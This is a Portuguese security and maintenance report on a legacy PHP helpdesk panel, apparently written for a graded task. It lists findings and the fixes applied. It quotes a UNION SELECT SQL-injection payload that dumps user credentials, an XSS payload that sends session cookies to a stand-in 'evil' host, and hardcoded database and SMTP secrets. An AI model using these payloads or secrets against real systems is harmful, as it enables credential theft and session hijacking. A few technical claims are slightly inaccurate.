# RELATÓRIO — LEB-100-A · Manutenção do Painel de Chamados

## 1. Resumo

O sistema é um painel PHP/mysqli em produção desde 2013, com 5 arquivos (config, index, lib, schema, seed). Três problemas centrais impediam que o sistema realmente cumprisse o contrato do `manifest.md`:

1. **Quebra do contrato de visibilidade** — clientes conseguiam ver, detalhar e exportar chamados de outros clientes (regra explícita do manifesto, não cumprida pelo código).
2. **Injeção de SQL refletida** em `listarChamados` via `?busca=` (concatenação direta na cláusula `LIKE`).
3. **XSS refletido** no `index.php` — o termo de busca era ecoado em dois pontos da resposta (valor do campo e parágrafo "Resultados para") sem `htmlspecialchars`.

Há ainda falhas de menor impacto já conhecidas pelo comentário do próprio `config.php` (MD5 + chave de SMTP embutidas) que exigem migração de banco/deployment para corrigir sem quebrar compatibilidade, e melhorias de performance e endurecimento de sessão que foram feitas como parte da mesma passada.

Todas as correções preservam a superfície pública: nomes de funções, parâmetros, retornos, rotas GET, formato CSV, estrutura HTML da listagem, rótulos de status e a assinatura mysqli. As funções `lib.php` ganharam **parâmetros opcionais** ao final (`?int $usuarioId`, `?string $papel`) para que os scripts do ISP que já as consomam continuem chamando como antes; só o `index.php` passa os novos argumentos para impor a regra.

---

## 2. Achados (por ordem de prioridade de correção)

### F1 — Injeção de SQL em `listarChamados` via parâmetro `busca`

- **Onde**: `code/lib.php:82` (linha original, na string `$sql .= " WHERE titulo LIKE '%" . $busca . "%'";`).
- **Mecanismo**: o valor de `$_GET['busca']` é concatenado diretamente na SQL. Nada valida, escapa ou parametriza o termo. Um atacante envia `?busca=' UNION SELECT id,login,senha,nome,papel,1,1,1,1 FROM usuarios -- ` e a `LIKE` vira `LIKE '%' UNION SELECT ... FROM usuarios -- %'`, devolvendo login e hash MD5 de todos os usuários em colunas que o `index.php` depois renderiza em HTML (título e demais campos), expondo credenciais a qualquer visitante anônimo que saiba da falha. Não exige login: a rota é pública depois da autenticação, então qualquer sessão válida (até de um cliente) basta.
- **Impacto**: leitura arbitrária do banco (credenciais, dados de clientes, descrições de chamados); potencial destruição com `UNION ... DELETE` ou stacked queries se o driver permitir; pivô para comprometimento total do esquema.
- **Severidade**: **crítica**.
- **Confiança**: **99**.
- **O que fiz**: troquei a concatenação por `prepare()` + `bind_param('s', '%' . $busca . '%')` (a concatenação agora é feita **antes** de passar ao placeholder, que é o caminho seguro com `LIKE`). Adicionalmente, o filtro é montado como `array de condições` para que cada `?` fique corretamente tipado.

### F2 — XSS refletido via parâmetro `busca` no `index.php`

- **Onde**: `code/index.php:79` (`<input ... value="' . $busca . '" ...>`) e `code/index.php:82` (`<p>Resultados para: ' . $busca . '</p>`).
- **Mecanismo**: o valor de `$_GET['busca']` é refletido em duas posições da resposta HTML sem `htmlspecialchars`. Em `value="..."` o atacante usa `" autofocus onfocus="alert(1)` para roubar foco e disparar JS; em `<p>` ele injeta `<script>document.location='https://evil/?c='+document.cookie</script>` para sequestro de sessão. Como a página exige login, o cookie de sessão é o alvo natural.
- **Impacto**: roubo de sessão de qualquer usuário logado (cliente ou técnico), phishing no contexto do painel, CSRF por script.
- **Severidade**: **crítica**.
- **Confiança**: **99**.
- **O que fiz**: calculei `$buscaAttr = htmlspecialchars($busca, ENT_QUOTES, 'UTF-8')` uma vez e uso nas duas posições; ENT_QUOTES porque uma das posições é atributo entre aspas duplas. Apliquei `htmlspecialchars` também em `formatarStatus(...)` e `rotuloPrioridade(...)` na listagem e no detalhe por defesa em profundidade (hoje retornam ASCII, mas isso trava regressões).

### F3 — Regra de visibilidade do manifesto não é aplicada

- **Onde**: `code/lib.php:78-93` (`listarChamados`), `code/lib.php:98-102` (`verChamado`), `code/lib.php:123-151` (`exportarCsv`), `code/lib.php:107-117` (`mediaResposta`); `code/index.php` que **já** lê `$uid`/`$papel` da sessão (linhas 38-39 originais) e simplesmente nunca os passa adiante.
- **Mecanismo**: o `index.php` lê `$uid` e `$papel` de `$_SESSION` mas ignora; as funções de `lib.php` recebem só `$db`. Consequência: qualquer cliente logado vê, detalha e exporta **todos** os 5 chamados do banco, mesmo os de outros clientes. O `manifest.md §"Regra de negócio (visibilidade)"` é explícito: "Um cliente só pode ver os chamados que ele mesmo abriu. Um técnico pode ver qualquer chamado." O código não cumpre. Note que `index.php` na rota `?ver=103` (chamado do Bruno) trazia para a Ana todos os campos, inclusive descrição — o que, combinado com F2, era também vetor de XSS via DB.
- **Impacto**: vazamento de chamados entre clientes (incluindo descrições que podem ter PII ou comentários internos), e o CSV exportado por um cliente continha toda a base. Quebra de regra de negócio declarada.
- **Severidade**: **crítica**.
- **Confiança**: **99**.
- **O que fiz**: adicionei dois parâmetros opcionais ao final das funções (`?int $usuarioId = null, ?string $papel = null`). Quando `$papel === 'cliente'` e `$usuarioId` é informado, as funções adicionam `AND c.usuario_id = ?` (ou equivalente) à cláusula `WHERE`. Para `'tecnico'`, nenhum filtro é aplicado. O `index.php` agora passa `($uid, $papel)` em todas as chamadas (`listarChamados`, `verChamado`, `exportarCsv`, `mediaResposta`). Assinaturas originais continuam válidas — chamadas que ignoram os novos args recebem o comportamento legado (sem filtro), preservando os outros scripts do ISP.

### F4 — Credenciais embutidas no `config.php`

- **Onde**: `code/config.php:12` (`DB_PASS`) e `code/config.php:15` (`SMTP_API_KEY`).
- **Mecanismo**: o fallback `?: 'N3tX@2013!prod'` e a string `netx-smtp-9f83e2c1a7b64d05` vivem no código-fonte versionado. Qualquer vazamento de repositório (interno, CI, mirror) entrega senha de produção do MySQL e chave de SMTP. O comentário "fallback embutido — legado" reconhece o problema mas não o resolve.
- **Impacto**: credencial persistente em todo clone do código; em ambiente onde as envs não estão setadas, são as credenciais reais em uso.
- **Severidade**: **alta**.
- **Confiança**: **95**.
- **O que fiz**: **não removi** os fallbacks. A remoção quebraria a aplicação se as envs não estiverem setadas no deploy atual, o que viola a restrição "Não reescreva o sistema". O env-var já tem precedência (`getenv(...) ?: 'fallback'`). A decisão de removê-los é de deploy/secrets-management, não desta camada; documento na seção Decisões.

### F5 — Hashing de senha com MD5

- **Onde**: `code/lib.php:15` (`$hash = md5($senha)`); `code/schema.sql:7` (coluna `senha CHAR(32)`); `code/seed.sql:5-8` (valores `MD5(...)`).
- **Mecanismo**: MD5 é rápido e sem sal. Um atacante com leitura do banco (ex.: via F1 antes do fix, ou via qualquer outro vetor) quebra a maior parte das senhas em horas com wordlists. A coluna com tamanho fixo `CHAR(32)` reforça que o esquema foi desenhado para MD5. Migrar para `password_hash`/`password_verify` é o conserto correto, **mas** exige: nova coluna (ou shadow), mudança no login, re-hash no próximo login, e atualização do `seed.sql` — fora do escopo "evolua, não reescreva".
- **Impacto**: colisão de hash trivial, exposição de credenciais se o banco vazar.
- **Severidade**: **alta**.
- **Confiança**: **95**.
- **O que fiz**: **não migrei** o esquema. A função `autenticar` continua usando `md5`. Documentado em Decisões; a migração é um projeto à parte.

### F6 — Concatenação de SQL em `verChamado`, `tecnicoNome` e query do `exportarCsv`

- **Onde**: `code/lib.php:69` (`tecnicoNome`), `code/lib.php:100` (`verChamado`), `code/lib.php:132` (query do `exportarCsv`).
- **Mecanismo**: queries montadas por concatenação. Hoje os parâmetros usados nessas chamadas são `int` por assinatura (`?int $tecnicoId`, `int $id`) e nenhum input externo entra na query do export — então **não há injeção ativa**. O risco é latente: o tipo pode ser afrouxado por refactor, a função pode ser reusada por outro script, e a defesa em profundidade é a prática padrão. Custa pouco consertar.
- **Impacto**: nenhum imediato; risco de regressão se alguém chamar `tecnicoNome($db, $_GET['x'])` ou similar.
- **Severidade**: **baixa** (defesa em profundidade).
- **Confiança**: **70**.
- **O que fiz**: converti todas para `prepare()` + `bind_param`. Como bônus, aproveitei para eliminar o **N+1** do `listarChamados` original (uma `SELECT nome` por chamado) trocando por um `LEFT JOIN usuarios` (ver F7).

### F7 — N+1 em `listarChamados` (uma query por chamado)

- **Onde**: `code/lib.php:78-93` originais.
- **Mecanismo**: para cada linha retornada por `SELECT * FROM chamados`, o loop chama `tecnicoNome($db, $c['tecnico_id'])` — uma `SELECT nome FROM usuarios WHERE id = ?` adicional. Com 5 chamados do seed são 6 queries; em produção com centenas de chamados isso vira facilmente centenas de queries por carregamento da página. O `index.php?export=csv` faz o mesmo.
- **Impacto**: latência crescendo linearmente com o volume, pressão desnecessária no banco.
- **Severidade**: **média** (performance).
- **Confiança**: **90**.
- **O que fiz**: troquei por um único `LEFT JOIN usuarios t ON t.id = c.tecnico_id` com `COALESCE(t.nome, '-') AS tecnico_nome`. Aplicado em `listarChamados`, `verChamado` e `exportarCsv`. `tecnicoNome` continua existindo (pode ser usada por outros scripts), mas não é mais chamada por estas três.

### F8 — Session fixation: id de sessão não regenerado após login

- **Onde**: `code/index.php:23-28` (originais).
- **Mecanismo**: quando o login dá certo, o app só grava `$_SESSION['uid']`/`['papel']`. O `PHPSESSID` permanece o mesmo. Um atacante que induz a vítima a usar um cookie de sessão conhecido (XSS, rede hostil, fixação explícita) consegue logar a vítima e, depois que ela autentica, manter o mesmo id — sequestrando a sessão autenticada.
- **Impacto**: takeover de conta no momento do login.
- **Severidade**: **média**.
- **Confiança**: **85**.
- **O que fiz**: chamei `session_regenerate_id(true)` antes de popular `$_SESSION`. O `true` apaga a sessão antiga no servidor.

### F9 — Cookie de sessão sem `httponly` / `samesite`

- **Onde**: `code/index.php:15` original (`session_start()` sem `session_set_cookie_params` prévio).
- **Mecanismo**: sem `httponly`, JS pode ler `document.cookie` e qualquer XSS (F2 antes do fix) sequestra a sessão. Sem `samesite`, o cookie trafega em cross-site, ampliando o raio de CSRF.
- **Impacto**: amplifica F2 e abre porta a CSRF básico.
- **Severidade**: **média**.
- **Confiança**: **80**.
- **O que fiz**: adicionei `session_set_cookie_params(['lifetime'=>0,'path'=>'/','httponly'=>true,'samesite'=>'Lax'])` antes de `session_start()`. Mantive `secure` fora do default para não quebrar o ambiente de dev (HTTP); pode ser ligado por env em produção.

### F10 — CSV escreve em arquivo temporário de caminho fixo

- **Onde**: `code/lib.php:125-150` originais.
- **Mecanismo**: `fopen('/var/www/painel/tmp/chamados.csv', 'w')` cria/sobrescreve um arquivo em caminho conhecido, sem `flock`. Duas requisições simultâneas corrompem o arquivo (o `fputcsv` de uma thread pode ser intercalado com o `readfile` da outra). O arquivo fica no disco após o envio (não é apagado). O caminho é fixo, sem randomização. Não há checagem do retorno de `fopen` consistente (silencia falha com `return;` em alguns casos e prossegue em outros).
- **Impacto**: race entre requisições, vazamento de CSV no disco, acúmulo de arquivos, falha silenciosa.
- **Severidade**: **média**.
- **Confiança**: **75**.
- **O que fiz**: abandonei o arquivo temporário. Agora `exportarCsv` envia o `Content-Type`/`Content-Disposition` e escreve direto em `php://output` com `fputcsv`, fechando ao final. Sem I/O de disco, sem race, sem arquivo residual.

### F11 — Divisão por zero em `mediaResposta`

- **Onde**: `code/lib.php:116` original (`return $soma / $qtd;`).
- **Mecanismo**: se nenhum chamado tiver `minutos_resposta IS NOT NULL`, `$qtd` permanece 0 e a função dispara `DivisionByZeroError` (PHP) ou retorna `NAN` (sutil de detectar). A página explode.
- **Impacto**: tela em branco na home se o banco for zerado.
- **Severidade**: **baixa**.
- **Confiança**: **85**.
- **O que fiz**: troquei a média em PHP pela média em SQL (`SELECT AVG(minutos_resposta)`). Quando o conjunto é vazio, `AVG` devolve `NULL` e devolvo `0.0`. Sem divisão por zero, e ainda economizo o tráfego de trazer todos os valores para o PHP somar um a um.

### F12 — Saída inconsistente: `formatarStatus`/`rotuloPrioridade` não escapadas em todos os pontos

- **Onde**: `code/index.php:61, 63, 92, 93` originais.
- **Mecanismo**: `htmlspecialchars` era aplicado em `titulo`, `descricao` e `tecnico_nome`, mas não nas saídas de `formatarStatus` e `rotuloPrioridade`. Hoje essas funções só retornam literais ASCII, então o risco é zero. Mas se alguém um dia internacionalizar essas strings ou elas vierem a incluir acentos em entidades, o escape inconsistente vira regressão de XSS latente.
- **Impacto**: nenhum hoje; defesa em profundidade.
- **Severidade**: **baixa**.
- **Confiança**: **60**.
- **O que fiz**: padronizei — todo dado dinâmico ecoado no HTML passa por `htmlspecialchars`. Saída de `formatarStatus`/`rotuloPrioridade` também passam, embora o conteúdo atual não tenha caracteres especiais.

### F13 — `formatarStatus` retorna `Resolvido` para qualquer status desconhecido

- **Onde**: `code/lib.php:26-35` original.
- **Mecanismo**: o ramo `else` final retorna `'Resolvido'` para qualquer valor que não seja 1 ou 2 — inclusive status 0, 4, 5, etc. O `schema.sql` define `status TINYINT DEFAULT 1` sem `CHECK`, então o banco aceita qualquer valor. Se um registro entrar com `status = 0` por bug em outro script, o painel mostra "Resolvido" silenciosamente.
- **Impacto**: classificação errada de status em casos anômalos.
- **Severidade**: **baixa**.
- **Confiança**: **60**.
- **O que fiz**: reescrevi como `if/if/return` explícito (mantendo o mesmo retorno para 1/2/3 e "Resolvido" como fallback). Comportamento observável para os valores válidos é idêntico; só fica mais legível. Decidi **não** levantar exceção nem retornar `null` para valores fora de {1,2,3} porque o contrato do manifesto não diz o que fazer nesses casos e quebrar isso pode surpreender o relatório gerencial.

---

## 3. Decisões — o que deliberadamente NÃO mudei

1. **Migração do hash de senha de MD5 para `password_hash`/`password_verify`.** Exige nova coluna, migração de todos os hashes existentes (re-hash no próximo login), atualização do `schema.sql` e do `seed.sql`, e compatibilidade entre os dois esquemas durante a transição. É um projeto de migração de banco, não uma "evolução" do código de autenticação. Fica como finding de alta severidade em F5.
2. **Remoção dos fallbacks hardcoded em `config.php` (`DB_PASS`, `SMTP_API_KEY`).** A precedência por env já existe. Remover o fallback é mudança de contrato de deploy — qualquer ambiente sem env setado (provavelmente vários em produção hoje) deixa de subir. Fica como F4.
3. **Adição de CSRF no formulário de login.** O impacto é baixo (a única ação é revelar dados do próprio usuário) e somaria um token por sessão, alterando mais fluxo. Pode entrar num próximo pacote focado em auth.
5. **Não exigi os parâmetros novos nas funções públicas de `lib.php`.** Tornar `$usuarioId`/`$papel` obrigatórios quebraria todos os outros scripts do ISP (rotina noturna, relatório gerencial) que consomem essas funções com a assinatura antiga. Como parâmetros opcionais, o legado continua funcionando e o `index.php` opta pelo modo seguro. É uma extensão, não uma quebra.
6. **Não troquei o stack nem a camada de dados.** Continua PHP + `mysqli`, sem dependências novas. As funções permanecem recebendo `mysqli` como primeiro parâmetro, mantendo o contrato.
7. **Não renomeei/movi arquivos de `code/`.** `config.php`, `index.php`, `lib.php`, `schema.sql`, `seed.sql` continuam nos mesmos lugares e com os mesmos nomes.
8. **Não alterei a estrutura HTML da listagem (`id="tabela-chamados"`, ordem das colunas, links por ID), nem o formato CSV (cabeçalho exato, ordenação por id, ordem das colunas), nem os rótulos de status.**
9. **Não adicionei cabeçalhos de segurança adicionais (CSP, X-Frame-Options, X-Content-Type-Options).** Não estavam no contrato e podem quebrar consumidores que incluem a página em frame. Se forem desejados, é pacote à parte.
10. **`formatarStatus` continua retornando `'Resolvido'` como fallback de qualquer status fora de {1,2,3}**, em vez de lançar erro ou devolver `null`. O manifesto não define o comportamento esperado e o relatório gerencial pode depender do string atual.